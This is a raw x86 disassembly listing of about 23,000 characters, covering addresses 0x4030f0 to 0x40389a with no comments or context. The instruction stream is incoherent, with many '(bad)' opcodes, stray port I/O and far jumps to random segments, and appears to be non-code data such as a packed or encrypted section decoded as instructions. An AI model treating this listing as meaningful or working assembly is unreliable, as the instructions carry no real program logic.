  4030f0:	and    DWORD PTR [ebx-0x23],ebp
  4030f3:	and    BYTE PTR [ecx+0x56],bl
  4030f6:	std    
  4030f7:	jbe    0x403148
  4030f9:	fbld   TBYTE PTR [ecx+0x3f]
  4030fc:	and    BYTE PTR [esi],dl
  4030fe:	push   ebp
  4030ff:	xor    eax,DWORD PTR [eax-0x4d8a16ff]
  403105:	lds    esi,FWORD PTR [esp+0x78]
  403109:	dec    eax
  40310a:	call   0x3459aa1e
  40310f:	gs adc bh,0x2
  403113:	das    
  403114:	sbb    DWORD PTR [ebx+0x3d],ebx
  403117:	adc    bl,BYTE PTR [esi-0xce47288]
  40311d:	les    eax,FWORD PTR [esi+0x61362992]
  403123:	or     DWORD PTR [eax-0x5b],0x6213c595
  40312a:	outs   dx,BYTE PTR ds:[esi]
  40312b:	push   esi
  40312c:	dec    esp
  40312d:	icebp  
  40312e:	cmp    al,0xaf
  403130:	mov    edx,0x4387bc5d
  403135:	outs   dx,DWORD PTR ds:[esi]
  403136:	add    ah,ah
  403138:	push   ss
  403139:	fwait
  40313a:	daa    
  40313b:	mov    bl,0x41
  40313d:	inc    esi
  40313e:	sti    
  40313f:	js     0x40312f
  403141:	ins    BYTE PTR es:[edi],dx
  403142:	adc    bl,cl
  403144:	jns    0x4030e2
  403146:	pop    esi
  403147:	test   ah,bl
  403149:	mov    esp,0x63557932
  40314e:	jnp    0x403105
  403150:	push   ebp
  403151:	mov    ah,0x9c
  403153:	ret    
  403154:	xchg   BYTE PTR [eax+0x43],al
  403157:	outs   dx,DWORD PTR ds:[esi]
  403158:	ror    DWORD PTR [ebp-0x43],1
  40315b:	bound  edi,QWORD PTR [edi+0x41]
  40315e:	add    eax,0x74bd5ddd
  403163:	mov    al,cs:0x6ec77a02
  403169:	popf   
  40316a:	pop    esp
  40316b:	sahf   
  40316c:	mov    dl,0xc2
  40316e:	iret   
  40316f:	aad    0xb1
  403171:	ins    BYTE PTR es:[edi],dx
  403172:	loope  0x4031b5
  403174:	push   0xffffff88
  403176:	lds    esp,FWORD PTR [esi+0x6bfbedc2]
  40317c:	dec    edi
  40317d:	outs   dx,BYTE PTR ds:[esi]
  40317e:	int3   
  40317f:	mov    edx,eax
  403181:	add    DWORD PTR [ecx+0x1f],0x57
  403185:	fistp  QWORD PTR [ecx]
  403187:	shr    DWORD PTR [ecx],1
  403189:	hlt    
  40318a:	xchg   ecx,eax
  40318b:	aas    
  40318c:	pushf  
  40318d:	inc    eax
  40318e:	and    al,0x4
  403190:	(bad)  
  403191:	in     al,dx
  403192:	(bad)  
  403193:	lock pop ds
  403195:	rcr    BYTE PTR ds:0xd0e9b671,1
  40319b:	gs pop ebp
  40319d:	add    eax,0xf1679502
  4031a2:	repz add esi,ecx
  4031a5:	repz jo 0x403224
  4031a8:	inc    edx
  4031a9:	cdq    
  4031aa:	dec    edx
  4031ab:	add    DWORD PTR [edx+0x5c],ecx
  4031ae:	je     0x4031df
  4031b0:	sbb    esi,DWORD PTR [edi-0x2e]
  4031b3:	lods   al,BYTE PTR ds:[esi]
  4031b4:	aas    
  4031b5:	add    ebx,esi
  4031b7:	sub    edi,DWORD PTR [ebp+0x3696083d]
  4031bd:	in     al,dx
  4031be:	inc    esi
  4031bf:	pop    eax
  4031c0:	fstp   QWORD PTR [eax]
  4031c2:	jecxz  0x4031ec
  4031c4:	or     ebx,ecx
  4031c6:	fucomip st,st(5)
  4031c8:	out    0x2b,al
  4031ca:	mul    DWORD PTR [ebp-0x7a4a163e]
  4031d0:	xor    al,0x41
  4031d2:	repnz imul esi,DWORD PTR [ecx-0x38],0x5b
  4031d7:	call   0x505fa4ab
  4031dc:	lahf   
  4031dd:	pop    esi
  4031de:	lea    esp,[edx-0x70]
  4031e1:	mov    ebx,0xd5af4fac
  4031e6:	(bad)  
  4031e7:	in     eax,0xd2
  4031e9:	hlt    
  4031ea:	push   es
  4031eb:	mov    edx,0xb337b282
  4031f0:	test   eax,0xfcfdaf71
  4031f5:	pop    esp
  4031f6:	cmp    ebp,0xffffffec
  4031f9:	or     bl,bh
  4031fb:	pop    ss
  4031fc:	jge    0x403231
  4031fe:	xchg   edi,eax
  4031ff:	outs   dx,DWORD PTR ds:[esi]
  403200:	mov    ah,0x38
  403202:	dec    ebp
  403203:	push   esp
  403204:	or     BYTE PTR [edx+ecx*2-0x64],bl
  403208:	mov    esi,0x6e128605
  40320d:	in     al,0x5a
  40320f:	jl     0x40323f
  403211:	push   esi
  403212:	add    DWORD PTR [ebx+eiz*2-0x31427e1a],esp
  403219:	(bad)  
  40321a:	les    edi,FWORD PTR [edx]
  40321c:	lods   al,BYTE PTR ds:[esi]
  40321d:	pusha  
  40321e:	pusha  
  40321f:	daa    
  403220:	mov    ah,BYTE PTR [esi-0x57]
  403223:	div    DWORD PTR ds:0x87f18354
  403229:	pusha  
  40322a:	loope  0x40322c
  40322c:	pop    esp
  40322d:	cmp    eax,0x367408b7
  403232:	outs   dx,DWORD PTR ds:[esi]
  403233:	xchg   edi,eax
  403234:	(bad)  
  403235:	arpl   WORD PTR [ebp+0x5c985bc7],di
  40323b:	fcmovbe st,st(3)
  40323d:	loope  0x4031cc
  40323f:	add    esi,ebp
  403241:	mov    ds:0xa1d3c3b7,al
  403246:	jl     0x4031ea
  403248:	xor    BYTE PTR [ebp+0x6f57ad87],ah
  40324e:	sti    
  40324f:	(bad)  
  403250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403251:	mov    cl,BYTE PTR [ecx-0x2e]
  403254:	loope  0x403280
  403256:	popf   
  403257:	scas   al,BYTE PTR es:[edi]
  403258:	gs dec cx
  40325b:	lods   eax,DWORD PTR ds:[esi]
  40325c:	jno    0x4032d8
  40325e:	(bad)  
  40325f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403260:	cli    
  403261:	std    
  403262:	mov    al,ds:0x8ed87ec5
  403267:	es daa 
  403269:	into   
  40326a:	imul   edx,DWORD PTR [eax],0x1ab2c5d6
  403270:	stos   DWORD PTR es:[edi],eax
  403271:	sub    esp,DWORD PTR [edi+0x58]
  403274:	das    
  403275:	in     al,0x88
  403277:	lds    eax,FWORD PTR [ecx-0x6f4c29a9]
  40327d:	in     al,dx
  40327e:	fadd   DWORD PTR [eax+0x70d0e5bd]
  403284:	scas   al,BYTE PTR es:[edi]
  403285:	add    eax,0x904db3d
  40328a:	inc    edi
  40328b:	rol    al,cl
  40328d:	dec    BYTE PTR [edx+esi*1]
  403290:	inc    edx
  403291:	bound  eax,QWORD PTR [ecx+ecx*8]
  403294:	jge    0x40330c
  403296:	call   0x2a4:0x85a797d0
  40329d:	stos   DWORD PTR es:[edi],eax
  40329e:	inc    esi
  40329f:	aad    0x38
  4032a1:	std    
  4032a2:	call   0x828d2c83
  4032a7:	inc    eax
  4032a8:	bound  eax,QWORD PTR [ebx+ecx*2]
  4032ab:	or     bh,BYTE PTR [edx]
  4032ad:	adc    bl,dh
  4032af:	jle    0x4032b8
  4032b1:	das    
  4032b2:	sbb    dl,BYTE PTR [eax-0x6c75c1fa]
  4032b8:	js     0x4032db
  4032ba:	sbb    edx,0xffffffbc
  4032bd:	ss push es
  4032bf:	aas    
  4032c0:	jl     0x403257
  4032c2:	lahf   
  4032c3:	pop    dx
  4032c5:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4032c7:	xor    DWORD PTR [ebp-0x31],eax
  4032ca:	pop    esp
  4032cb:	mov    al,ds:0x1c6c82f2
  4032d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032d1:	mov    bl,0x89
  4032d3:	push   ds
  4032d4:	ins    BYTE PTR es:[edi],dx
  4032d5:	push   ds
  4032d6:	call   0x3935:0xd436bc45
  4032dd:	shl    ebx,1
  4032df:	mov    bh,0xed
  4032e1:	adc    DWORD PTR [eax+esi*1],0xc1b34b9f
  4032e8:	mov    bh,0xb0
  4032ea:	sub    bl,dh
  4032ec:	data16 mov ds:0xed41e6a3,al
  4032f2:	push   ecx
  4032f3:	les    esi,FWORD PTR [esi]
  4032f5:	lock out 0x29,eax
  4032f8:	or     esi,DWORD PTR [esi+ecx*1-0x50]
  4032fc:	mov    ebp,0x78f4ec73
  403301:	int    0x1e
  403303:	add    dl,0x20
  403306:	dec    ecx
  403307:	xchg   edx,eax
  403308:	lea    ebx,[esi+0x71]
  40330b:	inc    ebx
  40330c:	out    0xf5,eax
  40330e:	fsubr  DWORD PTR [ecx]
  403310:	push   esp
  403311:	je     0xbeba1c4a
  403317:	mov    ebp,es
  403319:	fbstp  TBYTE PTR [ebx+0x1b]
  40331c:	repnz fsubr DWORD PTR [edx]
  40331f:	lods   al,BYTE PTR ds:[esi]
  403320:	jmp    0x40333c
  403322:	jge    0x4032e5
  403324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403325:	jno    0x40335e
  403327:	jnp    0x4032b3
  403329:	cmp    ebp,DWORD PTR [ecx]
  40332b:	test   eax,0x12fc7709
  403330:	mov    eax,0xbd37463e
  403335:	mov    WORD PTR [eax+0x7b5158d0],es
  40333b:	jno    0x4032cc
  40333d:	stos   BYTE PTR es:[edi],al
  40333e:	test   DWORD PTR [ecx+0x17],ecx
  403341:	icebp  
  403342:	std    
  403343:	imul   eax,DWORD PTR [edx],0xfffffff9
  403346:	push   esi
  403347:	(bad)  
  403348:	xchg   edi,eax
  403349:	sahf   
  40334a:	push   esi
  40334b:	lahf   
  40334c:	jo     0x4033cb
  40334e:	and    DWORD PTR [eax+0x5f],esp
  403351:	pop    edx
  403352:	xchg   edi,eax
  403353:	neg    BYTE PTR [ebp-0x39]
  403356:	out    0x23,al
  403358:	ss arpl sp,ax
  40335b:	imul   ecx,DWORD PTR [ebp+0x4349bd3c],0x5c
  403362:	popf   
  403363:	scas   al,BYTE PTR es:[edi]
  403364:	ror    DWORD PTR [ebx-0x35],0xdc
  403368:	xchg   BYTE PTR [edx+0x33],ah
  40336b:	clc    
  40336c:	push   0xffffffd4
  40336e:	sti    
  40336f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403370:	or     al,0xa0
  403372:	mov    edx,0x90ea914
  403377:	icebp  
  403378:	jl     0x4033e5
  40337a:	enter  0xc136,0x73
  40337e:	adc    al,0xe0
  403380:	dec    edi
  403381:	cmp    bl,dh
  403383:	dec    ecx
  403384:	mov    ?,WORD PTR [eax+0x66]
  403387:	pop    eax
  403388:	inc    esi
  403389:	stc    
  40338a:	pop    edx
  40338b:	inc    edx
  40338c:	lock cld 
  40338e:	mov    cs,WORD PTR [esi+0x216b4ab8]
  403394:	pop    esp
  403395:	push   edx
  403396:	mov    ebp,0x48e0ed7
  40339b:	pop    ds
  40339c:	sbb    BYTE PTR [eax-0x5bf2bb00],ah
  4033a2:	gs or  al,0x18
  4033a5:	inc    eax
  4033a6:	add    al,0x82
  4033a8:	lea    eax,[esi]
  4033aa:	test   eax,0x79e6869f
  4033af:	lea    esp,[eax+0x6fb6595]
  4033b5:	or     ah,BYTE PTR [edx+0x4e]
  4033b8:	jae    0x4033da
  4033ba:	adc    dl,BYTE PTR [ebp-0xd]
  4033bd:	into   
  4033be:	out    0xe0,al
  4033c0:	xchg   ebx,eax
  4033c1:	xor    DWORD PTR [eax+0x5f],ebx
  4033c4:	cdq    
  4033c5:	icebp  
  4033c6:	sub    eax,0xecf4bbb0
  4033cb:	mov    ebp,0x8a9e7c4a
  4033d0:	mov    ecx,0xe058dd74
  4033d5:	(bad)  
  4033d6:	loopne 0x403450
  4033d8:	repz ret 
  4033da:	xchg   edx,eax
  4033db:	and    eax,0x950a33dc
  4033e0:	ror    esi,1
  4033e2:	pop    esi
  4033e3:	sub    eax,0xefb61050
  4033e8:	es sbb eax,0x5bc54473
  4033ee:	mov    eax,0x554ef9ad
  4033f3:	mov    DWORD PTR [eax+esi*8+0x19e58c33],esp
  4033fa:	pop    esp
  4033fb:	or     DWORD PTR [ebx],ebx
  4033fd:	mov    eax,0xb73d87df
  403402:	jno    0x403480
  403404:	fcmovnu st,st(0)
  403406:	test   DWORD PTR ds:0x63b27dd2,0x8449d205
  403410:	out    dx,eax
  403411:	ds nop
  403413:	push   edx
  403414:	mov    dh,0xdc
  403416:	rcr    DWORD PTR [ebx],cl
  403418:	data16 and dh,cl
  40341b:	lods   eax,DWORD PTR ds:[esi]
  40341c:	xchg   edx,eax
  40341d:	fist   WORD PTR [ecx+0x7d]
  403420:	cmp    ecx,DWORD PTR [ebp+0x59]
  403423:	push   cs
  403424:	jo     0x40349f
  403426:	sbb    ecx,esi
  403428:	and    eax,0xd389e31b
  40342d:	add    bh,al
  40342f:	and    esi,edi
  403431:	mov    ds:0x73d33a1b,eax
  403436:	and    DWORD PTR [edx+0x901fc9d],esi
  40343c:	xor    BYTE PTR [edx],cl
  40343e:	jno    0x40347b
  403440:	push   edx
  403441:	xlat   BYTE PTR ds:[ebx]
  403442:	pop    ecx
  403443:	imul   ebp,DWORD PTR [eax-0x4f],0xe0b19538
  40344a:	ret    0x6bb7
  40344d:	in     eax,dx
  40344e:	xor    BYTE PTR [edi],bl
  403450:	mov    DWORD PTR [eax+0x33],ebx
  403453:	sub    DWORD PTR [edi+0x25],esi
  403456:	lock clc 
  403458:	data16 and BYTE PTR [eax+esi*4],bl
  40345c:	xchg   esi,eax
  40345d:	and    al,0xe8
  40345f:	jo     0x40347f
  403461:	mov    esi,0xcd12719e
  403466:	lock xchg ebx,eax
  403468:	adc    DWORD PTR es:[edi],eax
  40346b:	les    ebx,FWORD PTR [edx+ebx*4+0x12b286d8]
  403472:	pop    ecx
  403473:	fisttp WORD PTR [ebp+0x76]
  403476:	scas   eax,DWORD PTR es:[edi]
  403477:	add    DWORD PTR [edx],eax
  403479:	pop    es
  40347a:	frstor [esi]
  40347c:	popf   
  40347d:	loop   0x4034c7
  40347f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403480:	retf   0x5568
  403483:	icebp  
  403484:	or     DWORD PTR [eax+ebx*2+0x13],ebp
  403488:	jbe    0x403482
  40348a:	scas   eax,DWORD PTR es:[edi]
  40348b:	nop
  40348c:	ins    BYTE PTR es:[edi],dx
  40348d:	enter  0x1314,0xdb
  403491:	shl    BYTE PTR [eax-0x128f8f64],0x4e
  403498:	inc    ebp
  403499:	xchg   ebp,eax
  40349a:	bound  ebx,QWORD PTR [esi-0x1c]
  40349d:	aaa    
  40349e:	hlt    
  40349f:	loop   0x403460
  4034a1:	inc    eax
  4034a2:	add    ebp,DWORD PTR [edi-0x13b6aa4e]
  4034a8:	adc    BYTE PTR [esi],bl
  4034aa:	cli    
  4034ab:	inc    edi
  4034ac:	xor    BYTE PTR [eax+0x8],0x29
  4034b0:	inc    esi
  4034b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034b2:	push   es
  4034b3:	aam    0xf7
  4034b5:	test   DWORD PTR [edx+0x33],0x425b9e1a
  4034bc:	push   ss
  4034bd:	std    
  4034be:	ds pop edi
  4034c0:	ins    DWORD PTR es:[edi],dx
  4034c1:	dec    edx
  4034c2:	arpl   WORD PTR [ebx-0x35a392ac],ax
  4034c8:	push   cs
  4034c9:	retf   0x4400
  4034cc:	fidivr DWORD PTR [edx+edi*2-0x75]
  4034d0:	addr16 dec edx
  4034d2:	inc    esp
  4034d3:	inc    edi
  4034d4:	xor    eax,0xd836a76b
  4034d9:	enter  0x2c6c,0x61
  4034dd:	and    ch,bl
  4034df:	xor    DWORD PTR [ecx],0xaf623f0b
  4034e5:	sbb    BYTE PTR [edx+0x48],al
  4034e8:	mov    BYTE PTR [esi+0x4b2a24a5],dl
  4034ee:	hlt    
  4034ef:	adc    edi,esi
  4034f1:	jge    0x403523
  4034f3:	xchg   ebp,eax
  4034f4:	ret    0x1944
  4034f7:	pop    ecx
  4034f8:	add    esp,ecx
  4034fa:	jae    0x403532
  4034fc:	xchg   esi,eax
  4034fd:	outs   dx,BYTE PTR ds:[esi]
  4034fe:	cmp    eax,DWORD PTR [ecx]
  403500:	or     eax,0x8c350aa4
  403505:	ret    
  403506:	inc    ebp
  403507:	jmp    0x40353f
  403509:	jo     0x403501
  40350b:	pushf  
  40350c:	fistp  WORD PTR [ecx-0x60]
  40350f:	(bad)  
  403511:	jnp    0x4034b2
  403513:	popa   
  403514:	aad    0x91
  403516:	js     0x403595
  403518:	test   BYTE PTR [esi-0x718ff5fa],0x4d
  40351f:	inc    ebx
  403520:	pop    esi
  403521:	jecxz  0x40351e
  403523:	add    eax,0x9f8e30f
  403528:	jno    0x4034ec
  40352a:	outs   dx,BYTE PTR ds:[esi]
  40352b:	shl    ebx,1
  40352d:	jle    0x4034bd
  40352f:	adc    al,BYTE PTR [edx]
  403531:	addr16 mov ax,0x6268
  403536:	sub    DWORD PTR [edi-0x6c],0x4c
  40353a:	stc    
  40353b:	scas   al,BYTE PTR es:[edi]
  40353c:	out    dx,al
  40353d:	out    dx,eax
  40353e:	pop    edx
  40353f:	test   BYTE PTR [edx],dh
  403541:	call   0x3681bc2f
  403546:	mov    al,ds:0x7667d1f3
  40354b:	push   eax
  40354c:	mov    al,ds:0xd91a01b
  403551:	outs   dx,BYTE PTR ds:[esi]
  403552:	shl    dl,1
  403554:	xchg   ebp,eax
  403555:	sbb    BYTE PTR fs:[ebx],cl
  403558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403559:	push   DWORD PTR [ecx]
  40355b:	jp     0x4035ac
  40355d:	push   0xf4b23acf
  403562:	aaa    
  403563:	dec    esi
  403564:	mov    al,0x86
  403566:	inc    edx
  403567:	jb     0x4035e7
  403569:	inc    ebp
  40356a:	loope  0x403552
  40356c:	or     esp,esp
  40356e:	mov    ds:0xa3a415df,al
  403573:	xchg   ecx,eax
  403574:	fadd   QWORD PTR [edi]
  403576:	push   ss
  403577:	sub    bh,BYTE PTR [edx-0x32f4cb24]
  40357d:	sti    
  40357e:	or     ebp,DWORD PTR [esi+eax*2]
  403581:	ret    0xb42b
  403584:	jne    0x403534
  403586:	lds    ebp,FWORD PTR [ebp+0x124bcd1b]
  40358c:	xlat   BYTE PTR ds:[ebx]
  40358d:	dec    esi
  40358e:	addr16 pop ss
  403590:	pop    ebp
  403591:	sbb    al,0xb7
  403593:	(bad)  
  403594:	fmul   QWORD PTR [edx-0x1]
  403597:	mov    esp,0xb1609d31
  40359c:	adc    BYTE PTR [eax-0x1f8fc2],0xb6
  4035a3:	mov    ds:0xabe3ffda,al
  4035a8:	xchg   ecx,eax
  4035a9:	xchg   ebp,eax
  4035aa:	pusha  
  4035ab:	xchg   ebx,eax
  4035ac:	mov    edi,DWORD PTR [esi-0x695213c7]
  4035b2:	shl    DWORD PTR [edx+0x7f41a106],cl
  4035b8:	and    eax,0x12f823e1
  4035bd:	dec    ebx
  4035be:	mov    al,ds:0x783be7ad
  4035c3:	fldcw  WORD PTR [eax-0x57]
  4035c6:	xchg   edx,eax
  4035c7:	push   ebp
  4035c8:	fstp   TBYTE PTR [ecx+ebp*2-0x54]
  4035cc:	hlt    
  4035cd:	fs mov bh,0xc8
  4035d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035d1:	inc    ecx
  4035d2:	push   eax
  4035d3:	fldcw  WORD PTR [ecx]
  4035d5:	popa   
  4035d6:	sub    eax,0xb96fb44b
  4035db:	clc    
  4035dc:	jae    0x4035c9
  4035de:	dec    edx
  4035df:	adc    al,0xc5
  4035e1:	fmul   DWORD PTR gs:[edi]
  4035e4:	add    BYTE PTR [edi+0x4180eca7],dl
  4035ea:	sbb    al,0x65
  4035ec:	pop    eax
  4035ed:	push   eax
  4035ee:	ficom  DWORD PTR [edx+ebx*4-0xc]
  4035f2:	mov    esi,0x2d4801c4
  4035f7:	stc    
  4035f8:	ja     0x403679
  4035fa:	push   esp
  4035fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035fc:	mov    WORD PTR [esi-0x5b],gs
  4035ff:	lock adc DWORD PTR [ebp+0x6f204f9b],0x342509ef
  40360a:	int    0x56
  40360c:	push   edi
  40360d:	push   edx
  40360e:	cli    
  40360f:	daa    
  403610:	(bad)  
  403611:	and    dl,BYTE PTR [edx-0x1d]
  403614:	inc    edx
  403615:	es dec ebp
  403617:	lods   al,BYTE PTR ds:[esi]
  403618:	mov    edi,0xb8654311
  40361d:	aam    0xcb
  40361f:	and    BYTE PTR [esi-0x3c],dl
  403622:	fisubr DWORD PTR [ecx]
  403624:	xchg   esp,eax
  403625:	xchg   ecx,eax
  403626:	xchg   dh,ah
  403628:	iret   
  403629:	add    ecx,DWORD PTR [ebx+0x7d289436]
  40362f:	adc    BYTE PTR [edx+0x6efb63d8],0x54
  403636:	sub    eax,0x8d56aa47
  40363b:	add    al,0xd0
  40363d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40363e:	xchg   ebx,eax
  40363f:	repz xchg edi,eax
  403641:	imul   esi,DWORD PTR [ebx+0x59],0xa8b9acab
  403648:	sbb    BYTE PTR [esi],al
  40364a:	or     DWORD PTR [ecx-0x3e],esp
  40364d:	jo     0x403602
  40364f:	popf   
  403650:	sbb    BYTE PTR [ecx-0x4596a497],0x1c
  403657:	dec    esi
  403658:	fisttp WORD PTR [ecx+edx*2]
  40365b:	(bad)  [ecx-0x59]
  40365e:	leave  
  40365f:	cdq    
  403660:	es iret 
  403662:	add    al,0xa9
  403664:	pop    ds
  403665:	pop    esp
  403666:	test   bl,al
  403668:	pop    ss
  403669:	fsub   QWORD PTR [ecx+eax*4-0x75]
  40366d:	add    ecx,ebp
  40366f:	or     DWORD PTR [edx-0x7c],edi
  403672:	jno    0x4036ee
  403674:	in     al,0x93
  403676:	es sbb eax,0x2312d57e
  40367c:	or     al,0x28
  40367e:	shl    DWORD PTR [ebx],cl
  403680:	mov    ch,0xaf
  403682:	int    0x33
  403684:	into   
  403685:	sahf   
  403686:	(bad)  
  403687:	lds    esi,FWORD PTR [ebp-0x2f]
  40368a:	jl     0x403699
  40368c:	add    dh,BYTE PTR [esi-0x6c7df3e]
  403692:	retf   
  403693:	out    0x1d,eax
  403695:	shr    BYTE PTR ds:0xaca4e7e1,cl
  40369b:	sub    BYTE PTR [edi+0x1c],dh
  40369e:	sub    eax,DWORD PTR [ebp-0x51242739]
  4036a4:	aas    
  4036a5:	hlt    
  4036a6:	in     al,dx
  4036a7:	inc    esp
  4036a8:	js     0x4036b9
  4036aa:	aaa    
  4036ab:	sub    bh,dh
  4036ad:	xor    eax,0xe3f89d87
  4036b2:	(bad)  
  4036b3:	in     eax,0xe3
  4036b5:	daa    
  4036b6:	imul   ecx,ecx,0xd7c50b3a
  4036bc:	inc    ecx
  4036bd:	sub    eax,DWORD PTR [esi]
  4036bf:	mov    ch,0x2b
  4036c1:	pop    esp
  4036c2:	fadd   DWORD PTR [esi+0x5b]
  4036c5:	add    al,0x69
  4036c7:	xchg   BYTE PTR [eax-0x3bc87529],bl
  4036cd:	or     esp,esi
  4036cf:	loop   0x40372f
  4036d1:	or     eax,0x21ca7fa5
  4036d6:	adc    dl,BYTE PTR [ebx-0x61]
  4036d9:	ficom  WORD PTR [esi+0x9263dfe]
  4036df:	fidivr WORD PTR [edi+0x34]
  4036e2:	ins    DWORD PTR es:[edi],dx
  4036e3:	add    BYTE PTR [ebx-0xf635c10],ch
  4036e9:	(bad)  
  4036ea:	outs   dx,BYTE PTR ds:[esi]
  4036eb:	add    al,BYTE PTR [edx+0x79a69b6f]
  4036f1:	in     eax,dx
  4036f2:	arpl   WORD PTR [ebp+0x5e60966a],bx
  4036f8:	pop    ss
  4036f9:	ds mov ecx,0xaa946360
  4036ff:	cmp    al,0xb7
  403701:	add    cl,BYTE PTR [esi]
  403703:	jmp    0x6355:0xf2535f67
  40370a:	nop
  40370b:	pushf  
  40370c:	sub    al,0x81
  40370e:	int    0xe6
  403710:	je     0x403776
  403712:	jbe    0x4036f5
  403714:	cmc    
  403715:	popa   
  403716:	iret   
  403717:	outs   dx,DWORD PTR ds:[esi]
  403718:	sbb    al,0x25
  40371a:	cld    
  40371b:	lods   al,BYTE PTR ds:[esi]
  40371c:	pop    es
  40371d:	add    BYTE PTR [eax+ebp*4+0x72ba6c48],dh
  403724:	das    
  403725:	xor    DWORD PTR [edx-0x4243ad55],ebx
  40372b:	add    al,0x3e
  40372d:	fbld   TBYTE PTR [ebx-0x734e9012]
  403733:	push   ds
  403734:	add    dl,BYTE PTR [ecx+0x1d52c9e4]
  40373a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40373b:	shl    BYTE PTR [ebx-0x14307eab],1
  403741:	clc    
  403742:	sbb    dl,dh
  403744:	(bad)  
  403746:	outs   dx,BYTE PTR ds:[esi]
  403747:	jmp    0x9d25:0x6fa05ade
  40374e:	lahf   
  40374f:	aas    
  403750:	test   BYTE PTR [ecx+0x66],dh
  403753:	call   0xea914e88
  403758:	or     DWORD PTR [ebp+0x2f3d1d06],ebp
  40375e:	jns    0x40371c
  403760:	add    al,0xff
  403762:	xor    dh,al
  403764:	pop    edx
  403765:	or     al,0xbc
  403767:	adc    esi,ecx
  403769:	adc    BYTE PTR [eax],bh
  40376b:	cmp    al,0x64
  40376d:	adc    DWORD PTR [ecx+0x42f489ad],eax
  403773:	les    edx,FWORD PTR [esi+0x3d]
  403776:	mov    cl,0x74
  403778:	jle    0x403796
  40377a:	pop    es
  40377b:	test   eax,0x8a70f95d
  403780:	dec    edx
  403781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403782:	sub    ah,ch
  403784:	loop   0x403788
  403786:	mov    esi,DWORD PTR [eax-0x1ecdb5c2]
  40378c:	lea    edi,[ebx]
  40378e:	call   0x4ae3:0x70293155
  403795:	mov    bl,0x83
  403797:	pusha  
  403798:	test   eax,0x9ad5db33
  40379d:	mov    bh,0x8f
  40379f:	fild   QWORD PTR [esi]
  4037a1:	push   edx
  4037a2:	jl     0x40373c
  4037a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037a5:	cmp    edi,DWORD PTR [edi+0x4e8437c5]
  4037ab:	mov    edx,DWORD PTR [esi-0x6c4f21af]
  4037b1:	jbe    0x4037ad
  4037b3:	enter  0x3406,0x3c
  4037b7:	pushf  
  4037b8:	ds add al,cl
  4037bb:	les    ebp,FWORD PTR [edx]
  4037bd:	inc    esp
  4037be:	mov    al,ds:0xa927095b
  4037c3:	push   edx
  4037c4:	xchg   ebp,eax
  4037c5:	xchg   esp,eax
  4037c6:	sub    DWORD PTR [ebp-0x51ccaf7a],0x7b
  4037cd:	mov    dl,0x13
  4037cf:	sahf   
  4037d0:	sub    BYTE PTR [edx-0x7fe69cbc],ch
  4037d6:	loop   0x403848
  4037d8:	inc    eax
  4037d9:	adc    ebp,ecx
  4037db:	cmp    ch,BYTE PTR [eax-0x1c9d2429]
  4037e1:	dec    ebx
  4037e2:	sbb    ebx,edi
  4037e4:	add    esi,DWORD PTR [eax-0x38cd779d]
  4037ea:	rcl    BYTE PTR [edx-0x7bc6b97d],1
  4037f0:	push   ss
  4037f1:	clc    
  4037f2:	(bad)  
  4037f3:	push   ds
  4037f4:	adc    dl,ah
  4037f6:	cmp    al,cl
  4037f8:	add    BYTE PTR [esi-0x70],bh
  4037fb:	add    DWORD PTR [edi],esi
  4037fd:	mov    edi,0x8c096c35
  403802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403803:	dec    ebp
  403804:	xor    al,0x7d
  403806:	stos   BYTE PTR es:[edi],al
  403807:	push   0x717d9008
  40380c:	lods   eax,DWORD PTR ds:[esi]
  40380d:	fsub   DWORD PTR [eax]
  40380f:	in     al,0x3b
  403811:	pusha  
  403812:	je     0x403887
  403814:	cld    
  403815:	in     al,0x18
  403817:	mov    al,0x1b
  403819:	xchg   edx,eax
  40381a:	mov    dl,0xd0
  40381c:	jl     0x54f494f2
  403822:	fcomip st,st(2)
  403824:	in     eax,dx
  403825:	mov    gs,WORD PTR [ebx+0x24dca808]
  40382b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40382c:	outs   dx,BYTE PTR ds:[esi]
  40382d:	rol    eax,1
  40382f:	rcl    BYTE PTR [eax],cl
  403831:	ins    DWORD PTR es:[edi],dx
  403832:	scas   eax,DWORD PTR es:[edi]
  403833:	sar    DWORD PTR [ecx-0x3d006e93],1
  403839:	cmp    eax,0x8b82d05e
  40383e:	into   
  40383f:	add    BYTE PTR [esp+ebp*8-0x31],cl
  403843:	xchg   ebx,eax
  403844:	ret    0x7830
  403847:	pusha  
  403848:	hlt    
  403849:	fcomi  st,st(5)
  40384b:	jno    0x403854
  40384d:	pop    eax
  40384e:	sub    al,0x47
  403850:	jae    0x40385a
  403852:	sbb    BYTE PTR [edi+0x16668daa],0xb6
  403859:	dec    edx
  40385a:	into   
  40385b:	imul   edi,DWORD PTR [edx+0x6bbb1b74],0xffffffda
  403862:	mov    cl,BYTE PTR [esi-0x4f]
  403865:	jno    0x4038bf
  403867:	xor    DWORD PTR [edx-0x3a],0xffffffe6
  40386b:	fisttp DWORD PTR [edi+0x4e6f7b65]
  403871:	mov    al,0x6b
  403873:	xchg   esi,eax
  403874:	inc    eax
  403875:	ror    BYTE PTR [edi],0xd0
  403878:	sbb    eax,0xde979099
  40387d:	jl     0x4038a7
  40387f:	jg     0x4038e8
  403881:	(bad)  
  403882:	push   ebx
  403883:	xchg   edx,eax
  403884:	mov    esp,0xc587cb28
  40388a:	mov    eax,ds:0x43249f22
  40388f:	aaa    
  403890:	outs   dx,DWORD PTR ds:[esi]
  403891:	(bad)
  403895:	push   0x750ecf83
  40389a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
